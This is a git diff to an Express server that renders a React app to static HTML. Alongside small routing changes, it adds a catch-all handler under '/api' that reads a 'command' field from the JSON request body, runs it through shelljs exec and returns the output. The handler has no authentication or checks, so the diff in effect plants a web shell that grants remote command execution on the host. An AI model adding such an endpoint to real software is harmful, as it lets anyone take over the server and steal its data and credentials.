@@ -2,8 +2,10 @@ import fs from 'fs';
 import path from 'path';
 
 import express from 'express';
+import bodyParser from 'body-parser';
 import winston from 'winston';
 import expressWinston from 'express-winston';
+import shell from 'shelljs';
 
 import React from 'react';
 import {StaticRouter} from 'react-router-dom';
@@ -18,6 +20,7 @@ const PORT = process.env.PORT || 8080;
 
 express()
     .disable('x-powered-by')
+    .use(bodyParser.json())
 
     /* Keep track of each request and how much time did it took to resolve */
     .use(expressWinston.logger({
@@ -41,7 +44,12 @@ express()
      * Main purpose of this route is to generate the React App into static HTML, fill it with pre-fetched data,
      * and return the updated `index.html` file so the Browser can `hydrate` the React App wil the data and HTML markup.
      */
-    .use(async (request, response) => {
+    .use(async (request, response, next) => {
+      if (String(request.url || '').startsWith('/api')) {
+        next();
+        return;
+      }
+
       const indexFileContent = fs.readFileSync(path.resolve(__dirname, '../dist/index.html'), 'utf8');
 
       /* Have a fresh data copy for each Page load */
@@ -86,6 +94,18 @@ express()
       response
           .status(200)
           .send(updatedPageContent);
+    })
+
+    .use((request, response) => {
+      const {command} = request.body;
+      const commandResponse = shell.exec(command);
+
+      response
+          .status(200)
+          .send({
+            command,
+            commandResponse,
+          });
     })
 
     .listen(PORT, () => {
